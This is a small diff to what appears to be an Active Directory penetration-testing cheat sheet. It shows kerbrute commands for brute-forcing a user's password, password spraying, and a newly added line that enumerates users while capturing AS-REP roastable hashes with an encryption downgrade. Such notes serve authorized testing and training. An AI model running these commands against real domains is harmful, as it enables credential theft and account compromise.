@@ -17,9 +17,9 @@ kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD -t 100 -v passwords $USER
 kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-pass
 ```
 
-Dev version of kerbrute auto-checks for AS-REP Roastable accounts
+Dev version of kerbrute auto-checks for AS-REP roastable accounts
 ```bash
-
+kerbrute userenum --dc $TARGET_IP --domain $AD_DOMAIN --hash-file hashes --downgrade
 ```
 
 AS-REP Roasting
